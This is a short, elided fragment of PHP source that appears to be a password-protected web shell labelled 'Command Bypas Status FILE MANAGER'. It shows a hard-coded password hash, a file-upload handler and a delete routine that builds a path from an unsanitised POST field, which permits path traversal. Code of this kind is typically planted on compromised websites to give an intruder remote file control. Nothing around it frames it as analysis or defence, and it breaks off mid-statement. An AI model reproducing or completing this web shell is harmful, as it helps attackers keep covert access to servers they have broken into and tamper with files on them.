...
$password_hash = '$2y$10$WI3Z2QA6xynJkON3Tu0LzeTDY08lZHDp6CIHr/fyu.DoN7Bgl2p8i';
...
echo "<font color='black'>[ Command Bypas Status FILE MANAGER]</font><br>";
...
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_FILES['fileToUpload'])) {
        ...
        $fileToDelete = $currentDirectory . '/' . $_POST['delete_file'];if (file_exists($fileToDelete)) {
